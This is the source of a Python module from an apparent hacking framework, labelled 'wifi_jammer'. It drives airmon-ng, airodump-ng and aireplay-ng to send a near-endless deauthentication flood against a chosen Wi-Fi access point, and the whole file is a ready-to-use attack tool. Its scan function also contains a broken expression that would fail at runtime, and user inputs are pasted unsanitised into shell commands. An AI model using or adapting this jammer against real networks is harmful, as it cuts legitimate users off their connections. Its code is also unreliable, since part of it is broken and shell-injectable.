#        Copyright (C) 2017 M4st3r L1nux Indonesia (Jh0n 1sl4nskh4_404)

from core.GarudaTools import *
import subprocess
import os
from core import colors
from core import getpath

conf = {
	"name": "wifi_jammer",
	"version": "1.0",
	"shortdesc": "jam wifi",
	"author": "M4st3rL1nux",
	"github": "JhonIslanskha",
	"by": "Jh0n 1sl4nskh4_404",
	"initdate": "24.2.2016",
	"lastmod": "26.5.2017",
	"apisupport": False,
	"needroot": 1,
	"dependencies": ["xterm", "aircrack-ng"]
}

# List of the variables
variables = OrderedDict((
	('interface', ['wlan0', 'wireless interface name']),
	('bssid', ['none', 'target BSSID address']),
	('essid', ['none', 'target ESSID name']),
	('mon', ['mon0', 'monitor']),
	('channel', ['11', 'target channel number']),
))

# Additional help notes
help_notes = colors.red+"this module will not work without root permission!\n this module will not work without xterm, aircrack-ng!"+colors.end

# Used with custom commands (remove this if are not using custom commands)
customcommands = {
	'scan': 'scan for target',
	'stop': 'terminate process'
}

# Simple changelog
changelog = "Version 1.0:\n\trelease"


def run():
	printInfo("attack has been started on : " + variables['essid'][0])
	printInfo("use command 'stop' to end attack" + colors.end)
	xterm_3 = "xterm -e "+ "airodump-ng" +" -c " + variables['channel'][0] + " --bssid " + variables['bssid'][0] + " " + variables['mon'][0] + " &"
	os.system(xterm_3)
	xterm_4 = "xterm -e "+"aireplay-ng"+" --deauth 9999999999999 -o 1 -a " + variables['bssid'][0] + " -e " + variables['essid'][0] + " " + variables['mon'][0] + " &"
	os.system(xterm_4)
	os.system(xterm_4)
	printInfo("attack started")

def stop(args):
	subprocess.Popen("killall xterm", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	subprocess.Popen("killall aireplay", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	xterm_5 =  "airmon-ng"+" stop " + variables['interface'][0]
	os.system(xterm_5)
	printSuccess("process terminated...")

def scan(args):
	xterm_1 = "airmon-ng"+" start " + variables['interface'][0]
	xterm_2 = "xterm -e "+"airmon-ng " + + variables['mon'][0] + " &"
	subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	os.system(xterm_2)
	printSuccess("scan started")